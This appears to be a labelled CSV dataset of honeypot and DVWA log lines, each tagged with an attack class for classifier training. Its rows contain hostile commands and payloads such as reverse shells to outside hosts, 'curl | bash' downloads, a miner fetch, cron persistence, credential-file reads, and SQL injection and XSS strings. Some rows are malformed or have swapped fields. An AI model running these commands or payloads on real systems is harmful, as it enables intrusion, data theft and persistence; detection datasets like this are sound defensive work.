text,label
source:cowrie event:cowrie.command.input ip:103.44.29.197 username:- password:- command:curl -s http://192.168.1.100/payload | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:103.196.191.46 username:- password:- command:- request:""GET /dvwa/phpinfo.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:45.213.173.106 username:- password:- command:tftp -g -r payload 10.0.0.5 request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:10.108.47.235 password:- username:- command:sudo bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.221.151.254 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:45.55.161.20 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:10.175.151.81 username:- password:- command:- request:""GET /dvwa/?dvwaSecurityLevel=low HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:10.13.245.22 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.success ip:10.100.72.154 username:sync password:password1 command:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3b+DROP+TABLE+users+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:185.38.203.41 username:lp password:jessica command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:172.30.233.25 username:- password:- command:echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> back.sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:103.132.31.49 username:bin password:letmein1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:103.106.47.250 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+HAVING+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:91.174.130.124 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.19.139.180 username:- password:- command:rpm -qa request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.251.114.92 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:185.129.149.88 username:gnats password:abc123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:10.158.110.200 username:- password:- command:cat ~/.ssh/authorized_keys request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:172.24.128.233 username:sshd password:welcome1 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:91.80.53.126 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:185.218.10.184 username:- password:- command:apt-get install -y netcat request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2fwww%2fhtml%2fdvwa%2fconfig%2fconfig.inc.php HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:cat /etc/shadow request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+table_name%2cnull+FROM+information_schema.tables+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:10.109.67.65 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1%3bINSERT+INTO+users(user,password)+VALUES('h4x','h4x')--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.91.124.59 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.129.8 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:45.234.18.180 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1=2+UNION+SELECT+table_name,null+FROM+information_schema.tables--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ifconfig request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+GROUP+BY+1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.client.version ip:176.24.157.110 username:- password:- command:- request:SSH-2.0-OpenSSH,RECON-COWRIE
"source:DVWA event:RECON ip:192.168.32.173 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fetc%2fhosts HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:203.95.24.125 username:mysql password:letmein1 command:- request:-,SSH_SUCCESS-COWRIE
event:cowrie.login.failed ip:185.168.124.95 username:uucp password:welcome command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.failed ip:45.240.128.99 username:admin password:admin command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:LOGIN ip:203.254.234.164 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:172.31.32.27 username:- password:- command:- request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:185.58.56.127 username:- password:- command:systemctl enable backdoor request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:103.168.103.134 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+HAVING+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:91.208.111.170 username:- password:- command:logout request:-,SSH_COMMAND-COWRIE
"event:LOGIN source:DVWA ip:45.149.237.219 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
event:cowrie.login.failed source:cowrie ip:192.168.215.101 username:apache password:abc123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.command.input ip:172.16.86.188 username:- password:- command:wget http://45.33.32.156/miner request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:w request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:10.228.141.147 username:apache password:princess command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:192.168.180.209 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:203.80.231.60 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:SQLi ip:91.239.28.207 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+sleep(3)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:192.168.244.137 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:91.51.63.231 username:- password:- command:- request:""POST HTTP/1.1"" /dvwa/login.php",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.client.kex ip:12.155.26.161 username:- password:- command:- request:-source:cowrie event:recon ip:12.155.26.161 username:root password:- command:- request:-,RECON-COWRIE
source:cowrie event:cowrie.login.success ip:172.28.214.43 username:nomad password:secret command:- request:-,SSH_SUCCESS-COWRIE
"source:DVWA event:SQLi ip:103.203.94.163 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+load_file('/etc/passwd'),null--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:203.97.116.141 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:103.78.251.102 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3bid&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
"source:DVWA event:SQLi ip:172.28.186.213 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+1%3d1+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:91.191.130.181 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.login.failed ip:103.129.22.186 username:backup password:000000 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:103.25.20.67 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:RECON ip:103.39.161.37 username:- password:- request:""GET command:- /dvwa/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(document.cookie)>&Submit=Submit HTTP/1.1""",XSS-DVWA
source:cowrie event:cowrie.login.failed ip:185.174.187.122 username:pi password:pass@123 command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:RECON ip:203.88.25.214 username:- password:- command:- request:""GET /dvwa/.env HTTP/1.1""",RECON-DVWA
source:cowrie event:cowrie.login.success ip:185.90.132.202 username:www-data password:admin@123 command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:10.245.30.123 username:- password:- command:cat /etc/hosts request:-,SSH_COMMAND-COWRIE
event:cowrie.command.input source:cowrie ip:45.138.148.125 username:- password:- command:(crontab -l; echo '*/5 * * * * /tmp/bot.sh') | crontab - request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep%285%29+--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:10.133.210.109 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+BENCHMARK(5000000,MD5(1))--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.72.133.69 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+AND+sleep(5)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:ls ~/.ssh request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:172.25.69.225 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+INTO+OUTFILE+'/var/www/html/shell.php'--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:45.19.144.145 username:- password:- command:ss -tulnp,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:91.25.153.176 username:- password:- command:echo 'd2hvYW1p' | base64 -d | sh request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:203.224.108.39 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1%3buname+-a&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:91.203.152.152 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:203.246.226.154 username:ubuntu password:welcome command:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:203.46.67.44 username:- password:- command:base64 -d <<< 'bWFsd2FyZQ==' | bash request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:172.21.92.135 password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.login.success ip:10.87.22.122 username:guest password:root command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:free request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:185.195.160.30 username:nginx password:toor command:- request:-,BRUTE_FORCE_SSH-COWRIE
source:cowrie event:cowrie.login.success ip:45.183.34.242 username:zabbix password:iloveyou command:- request:-,SSH_SUCCESS-COWRIE
source:cowrie event:cowrie.command.input ip:172.18.128.243 username:- password:- command:su - request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:192.168.244.137 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=%3cimg+src%3dx+onerror%3dalert%281%29%3e HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:uname request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:103.151.230.150 username:- password:- install -y nmap request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input username:- password:- command:ls -la /etc request:-,SSH_COMMAND-COWRIE
"source:DVWA event:LOGIN ip:185.57.235.186 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:192.168.65.208 username:- password:- command:bash -c 'bash -i >& /dev/tcp/45.33.32.156/1337 0>&1' request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:185.182.44.65 username:root password:letmein command:- request:-,SSH_SUCCESS-COWRIE
"event:SQLi ip:91.27.21.46 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+ORDER+BY+3--&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:172.28.203.147 username:- password:- command:echo '#!/bin/sh' > back.sh request:-,SSH_COMMAND-COWRIE
"source:cowrie event:cowrie.command.input ip:192.168.149.167 username:- password:- command:python3 -c 'import pty;pty.spawn(""/bin/bash"")' request:-",SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.failed ip:172.26.235.204 username:guest password:pass command:- request:-,BRUTE_FORCE_SSH-COWRIE
"source:DVWA event:SQLi ip:103.119.172.24 username:- password:- command:- /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit request:""GET HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
"source:DVWA event:SQLi ip:185.3.76.31 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1+UNION+SELECT+user(),version()--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:SQLi ip:203.81.48.96 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--+&Submit=Submit HTTP/1.1""",SQLI-DVWA
source:cowrie event:cowrie.command.input ip:10.95.82.98 username:- command:cat /etc/passwd request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.command.input ip:192.168.42.82 username:- password:- command:iptables -F request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:192.168.23.74 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2flog%2fauth.log HTTP/1.1""",RECON-DVWA
"source:DVWA event:LOGIN ip:172.29.30.3 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
source:cowrie event:cowrie.command.input ip:103.226.198.75 username:- password:- command:apt-get install -y netcat request:-,SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:192.168.247.177 username:- password:- command:- request:""GET /dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit HTTP/1.1""",XSS-DVWA
"source:DVWA event:SQLi ip:45.24.15.60 username:- password:- command:- request:""GET /dvwa/vulnerabilities/sqli_blind/?id=1+AND+sleep(3)--&Submit=Submit HTTP/1.1""",SQLI-DVWA
"source:DVWA event:LOGIN ip:103.220.74.35 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:LOGIN ip:103.172.215.205 username:- password:- command:- request:""POST /dvwa/login.php HTTP/1.1""",BRUTE_FORCE_WEB-DVWA
"source:DVWA event:RECON ip:172.20.204.124 username:- password:- command:- request:""GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1+%26%26+ls+-la+/tmp&Submit=Submit HTTP/1.1""",CMD_INJECTION-DVWA
source:cowrie event:cowrie.command.input ip:192.168.244.137 username:- password:- command:exit request:-,SSH_COMMAND-COWRIE
source:cowrie event:cowrie.login.success ip:192.168.135.34 username:list password:raspberry command:- request:-,SSH_SUCCESS-COWRIE
"source:cowrie event:cowrie.command.input ip:10.177.191.44 username:- password:- command:python3 -c 'import pty;pty.spawn(""/bin/bash"")' request:-",SSH_COMMAND-COWRIE
"source:DVWA event:RECON ip:45.103.208.178 username:- password:- command:- request:""GET /dvwa/vulnerabilities/fi/?page=..%2f..%2fvar%2fwww%2fhtml%2fdvwa%2fconfig%2fconfig.inc.php HTTP/1.1""",RECON-DVWA
"source:DVWA event:RECON ip:192.168.157.155 username:- password:- command:- request:""GET /dvwa/phpinfo.php HTTP/1.1""",RECON-DVWA
